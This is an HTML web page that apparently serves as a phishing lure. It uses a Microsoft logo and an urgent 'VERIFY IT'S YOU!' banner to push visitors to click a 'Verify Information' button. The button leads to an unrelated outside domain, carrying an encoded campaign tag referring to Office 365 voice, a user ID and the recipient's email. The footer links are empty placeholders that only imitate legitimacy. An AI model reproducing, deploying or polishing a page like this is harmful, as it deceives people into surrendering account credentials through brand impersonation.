<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="cache-control" content="no-store">
    <meta http-equiv="expires" content="0">
    <title>Error - Action Required</title>
    <link rel="icon" href="favicon.ico">
    <style>
        /* Reset */
        *,
        *::before,
        *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Body */
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background-color: #f4f6f8;
            color: #333;
        }

        /* Container */
        .container {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            padding: 20px;
        }

        /* Content Box */
        .content-box {
            max-width: 500px;
            width: 100%;
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        /* Logo */
        .logo {
            max-width: 120px;
            margin-bottom: 20px;
        }

        /* Title and Message */
        .title {
            font-size: 1.6rem;
            font-weight: bold;
            color: #444;
            margin-bottom: 10px;
        }

        .message {
            font-size: 1rem;
            color: #555;
            margin-bottom: 25px;
        }

        /* Button */
        .btn {
            display: inline-block;
            padding: 12px 24px;
            font-size: 1rem;
            font-weight: 600;
            color: #fff;
            background-color: #0066cc;
            border-radius: 4px;
            text-decoration: none;
            transition: background-color 0.3s;
        }

        .btn:hover {
            background-color: #004a99;
        }

        /* Footer */
        footer {
            text-align: center;
            font-size: 0.85rem;
            background-color: #e9ecef;
            padding: 15px;
        }

        footer a {
            color: #0066cc;
            text-decoration: none;
            margin: 0 8px;
        }

        footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="content-box">
            <!-- Logo Placeholder --> <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1200px-Microsoft_logo.svg.png" alt="Company Logo" style="width: 41px;"> <!-- Error Title -->
            <div class="title"><strong><span style='color: rgb(226, 80, 65); background-color: rgb(255, 255, 255); font-size: 19px; font-family: "Arial Black", Gadget, sans-serif;'>VERIFY IT&apos;S YOU!</span></strong></div><!-- Error Message -->
            <p class="message">We couldn&apos;t complete your request. Please verify your information to proceed.</p><!-- Action Button --> <a href="https://adhanuartha.com/m/?c3Y9bzM2NV8xX3ZvaWNlJnJhbmQ9V0hWNGIzWT0mdWlkPVVTRVIxNDEwMjAyNFUxNDEwMTQ0NQ==N0123N[EMAIL]" class="btn">Verify Information</a>
        </div>
    </div><!-- Footer Links -->
    <footer><a href="#">Terms of Service</a> <a href="#">Privacy Policy</a> <a href="#">Support</a> <a href="#">Contact Us</a></footer>
</body>

</html>
